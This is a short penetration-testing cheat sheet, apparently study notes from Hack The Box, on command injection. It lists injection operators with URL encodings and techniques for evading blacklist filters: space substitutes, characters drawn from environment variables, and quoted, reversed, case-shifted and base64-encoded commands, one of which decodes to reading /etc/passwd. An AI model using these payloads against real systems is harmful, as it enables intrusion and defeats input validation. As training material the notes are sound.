## Cheet shit 

Sirve para todos los lenguajes:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |
## Bypassing blacklisted

#### espacios
`%09` -> tabs

`${IFS}` ->Linux Environment Variable(por default se sustituye a un espacio)

con Braces

```shell-session
{ls,-la}
```

#### Chars

##### Linux
```
┌──(bonack㉿kali)-[~]  
└─$ echo ${PATH:0:1}  
  
/
```

```
bonack@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

```shell-session
bonack@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
bonack@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```


##### Windows

CMD

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

Power-Shell

```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\
```

#### Commands

COMILLAS

(el número de comillas que le metas tiene que ser par)

```
w'h'o'am'i
w"h"o"am"i
```

Solo para linux:

```bash
who$@ami
w\ho\am\i
```

```shell-session
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

```shell-session
$(rev<<<'imaohw')
```
(lo encodeado es el comando)
```shell-session
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

Solo Windos:

```cmd-session
C:\htb> who^ami
```

```powershell-session
PS C:\htb> WhOaMi
```

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
```
(lo encodeado es whoami)
```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))
```
